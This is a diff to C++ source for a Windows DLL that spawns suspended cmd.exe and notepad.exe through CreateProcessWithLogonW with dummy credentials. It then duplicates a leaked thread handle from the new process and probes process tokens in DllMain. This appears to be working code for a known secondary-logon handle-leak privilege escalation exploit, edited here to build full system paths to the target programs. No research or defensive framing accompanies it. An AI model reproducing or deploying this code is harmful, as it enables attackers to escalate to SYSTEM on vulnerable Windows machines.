@@ -5,6 +5,8 @@
 
 #define MAX_PROCESSES 1000
 
+
+
 HANDLE GetThreadHandle()
 {
 	PROCESS_INFORMATION procInfo = {};
@@ -14,11 +16,30 @@ HANDLE GetThreadHandle()
 	startInfo.hStdInput = GetCurrentThread();
 	startInfo.hStdOutput = GetCurrentThread();
 	startInfo.hStdError = GetCurrentThread();
-	startInfo.wShowWindow = SW_HIDE;
+	//startInfo.wShowWindow = SW_HIDE;
 	//StartInfo.dwFlags = STARTF_USESHOWWINDOW;
 	startInfo.dwFlags = STARTF_USESTDHANDLES;
 
-	if (CreateProcessWithLogonW(L"test", L"test", L"test", LOGON_NETCREDENTIALS_ONLY, nullptr, L"cmd.exe", CREATE_SUSPENDED, nullptr, nullptr, &startInfo, &procInfo))
+	WCHAR path[256];
+	DWORD reqSize = sizeof(path);
+	GetEnvironmentVariableW(L"WINDIR", path, reqSize);
+	wchar_t* appName = L"\\System32\\cmd.exe";
+	std::wstring s(path);
+	s += std::wstring(appName);
+	const wchar_t* fullAppName = s.c_str();
+
+	if (CreateProcessWithLogonW(
+		L"test",					//user
+		L"test",					//domain
+		L"test",					//pass
+		LOGON_NETCREDENTIALS_ONLY,	//logonflags		0x00000002 Same
+		fullAppName,					//ApplicationName	cmd.exe			(nullptr)
+		nullptr,					//CommandLine		""				(L"cmd.exe")
+		CREATE_SUSPENDED,			//CreationFlags		0x00000004 Same
+		nullptr,					//Environment		$null
+		nullptr,					//CurrentDirectory	CurrentPath
+		&startInfo,					//StartupInfo		
+		&procInfo))					//ProcessInfo
 	{
 		HANDLE hThread;
 		BOOL res = DuplicateHandle(procInfo.hProcess, (HANDLE)0x4, GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
@@ -149,10 +170,26 @@ BOOL WINAPI DllMain(HANDLE hModule,
 			startInfo.wShowWindow = SW_HIDE;
 			startInfo.dwFlags = STARTF_USESHOWWINDOW;
 
-			if (CreateProcessWithLogonW(L"test", L"test", L"test",
-				LOGON_NETCREDENTIALS_ONLY, nullptr,
-				L"cmd.exe", CREATE_SUSPENDED, nullptr, nullptr,
-				&startInfo, &procInfo))
+			WCHAR path[256];
+			DWORD reqSize = sizeof(path);
+			GetEnvironmentVariableW(L"WINDIR", path, reqSize);
+			wchar_t* appName = L"\\System32\\notepad.exe";
+			std::wstring s(path);
+			s += std::wstring(appName);
+			const wchar_t* fullAppName = s.c_str();
+
+			if (CreateProcessWithLogonW(
+				L"test",
+				L"test",
+				L"test",
+				LOGON_NETCREDENTIALS_ONLY,
+				fullAppName,
+				nullptr,
+				CREATE_SUSPENDED,
+				nullptr,
+				nullptr,
+				&startInfo,
+				&procInfo))
 			{
 				HANDLE hProcessToken;
 				// If we can't get process token good chance it's a system process.
